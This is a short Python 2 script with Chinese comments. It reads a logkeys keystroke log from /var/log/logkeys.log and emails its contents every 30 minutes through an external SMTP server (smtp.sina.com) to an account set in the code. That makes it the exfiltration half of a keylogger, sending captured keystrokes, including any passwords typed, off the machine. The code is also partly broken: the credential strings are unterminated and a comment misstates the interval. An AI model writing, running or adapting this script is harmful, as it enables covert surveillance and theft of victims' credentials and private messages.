#!/usr/bin/env python
#coding=utf-8

import smtplib
from email.Message import Message
import time
import optparse
import sched

schedular = sched.scheduler(time.time, time.sleep)

def sendMail(theEmail, thePasswd):
    systemTime=time.strftime( '%Y-%m-%d-%T', time.localtime(time.time()))
    try:
        fileobj = open("/var/log/logkeys.log", "r") #键盘记录的输出文件
        content = fileobj.read()
    except:
        #print "Cannot read file\n"
        exit()
    message = Message()
    message[ 'Subject' ] = 'Log keys' #邮件标题
    message[ 'From' ] = ""
    message[ 'To' ] = theEmail
    message.set_payload("当前时间" +systemTime+ "\n" +content) #邮件正文
    msg = message.as_string()

    #smtp = smtplib.SMTP_SSL("smtp.qq.com", port=465, timeout=30)
    smtp = smtplib.SMTP_SSL("smtp.sina.com",port=465, timeout=30)
    #smtp.set_debuglevel(1)  #开启debug模式
    #smtp.ehlo()            #me add  send ehlo to Gmail
    smtp.starttls()        #使用安全连接
    smtp.login(theEmail, thePasswd)
    smtp.sendmail( theEmail, theEmail, msg) #SMTP.sendmail(from_addr, to_addrs, msg[, mail_options, rcpt_options]) ：发送邮件。这里要注意一下第三个参数，msg是字符串，表示邮件。我们知道邮件一般由标题，发信人，收件人，邮件内容，附件等构成，发送邮件的时候，要注意msg的格式。这个格式就是smtp协议中定义的格式。
    time.sleep(5)          #避免邮件没有发送完成就调用了
    #quit()
    smtp.quit()
    #fileobj.truncate()
    #print "cleared file"
    fileobj.close()

def perform(inc, theEmail, thePasswd):
    schedular.enter(inc, 0, perform, (inc, theEmail, thePasswd))
    sendMail(theEmail, thePasswd)

def myMain(inc, theEmail, thePasswd):
    schedular.enter(0, 0, perform, (inc, theEmail, thePasswd))
    #print "myMain start"
    schedular.run()
    #print "myMain stop"

if __name__ == "__main__":
    optObj = optparse.OptionParser()
    optObj.add_option( "-u", dest = "user", help = "mail accoutn")
    optObj.add_option( "-p", dest = "passwd", help = "mail Passwd")
    (options, args) = optObj.parse_args()

    #emailName = options.user
    #emailPasswd = options.passwd
    emailName = "
    emailPasswd = "
    myMain(1800, emailName, emailPasswd)  #15表示的是相隔时间，可以根据自己的需求设

